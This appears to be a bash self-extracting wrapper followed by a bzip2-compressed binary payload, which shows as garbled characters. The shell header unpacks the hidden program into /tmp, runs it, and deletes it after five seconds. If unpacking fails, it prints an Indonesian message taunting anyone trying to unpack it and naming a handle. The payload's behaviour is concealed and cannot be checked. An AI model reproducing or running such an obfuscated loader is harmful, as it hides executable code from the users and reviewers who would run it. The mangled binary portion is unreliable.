#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�@��  �߀|�����0����P����t�=�t
� Ȑ)��Di=L�A4=CA�@�F� �I��4�4       E%=L���h������4  R A�� ��@4 h �B3Sʞ�i4��h�hi���M2 C�X���;;��}�̂	�a���@��Ir*7��GPPd�F׮F+�銚Җ���~ �
$�֑
��SQsq;��J�pb3a�VN91tT@e��[]{A ��C��X��~��?FZ��&��A��8N��n�sm��+�V�\� �ǈAԚ��p^�e��%�
�&�'x�B�Tx�a���9z�:��L�B�1v��4V�Df$�+��H:�Gc�5M��v�n^��sj���x(i�"M��5#|� z��2��0a�	��ii��p[6�i(���$dAUrv(�9}�Aa����X*����i��A*��28�p�/�U�����ih%�UaCb��bO^G R>i��$�d�w�l4T816����vմ�:�f��R���b��xW�v��=��u��1��Ӏ�k�;�Bm��t�C�6�L�M}�o���?<Qr*�R�!�;��yYQ�Wޡ
ϵ�H�G�`���8u��E<�Ȕ�b��(F�
�S?��5-�mqjU�P�0��$�P�E@9�\�'
��l�1�1XT���(�J�����
=�t-̞��Vt�����vo��\N���ɼ����&�y�#��ͩ�� T�V���SNІt�A1��%�:�������U+ �*Yf�C(Ԍ�l�$�چ��k�����xV�(㙚��L����C��t�l� $�C��D3�`�LR" pێ�7a�4j�Ǝ�7;^,��C�N^F�CFS�|&�q�QW$�N�&���MT�"��z;�3�E6��V�3�X&��	:2c�_�c�9TBz�B4L�8���t#nf[�}��t.�]�2t�(bK+X�n�v�C:qf���ʡf�އ}��i4�<M�`Q�^Ӄ���,p�0P3���	ص��\�����$0m��Э�,�L@��-�QRggF�������^�;���c���lD$��t�j?`�޾L��r�Q(����)�Hcm�ǡHW֎�	��l�P =�D�h��Ba���3���|wHhZ��bߕ���8�أk��8ɛ���L��3��82,\�β��X��#�`��<G.S�(p����t$���@�ƒ�m5�ݢ���v�l
���	�j31���b43/�ni��6�N$�*��N2v��z:dУ׃f�á?+����o�㛳,��ӟ[uLT��'-�.�Pь�V�%�a����.�C�<o}�41	�QǰՐ��6G�>��]��BB�8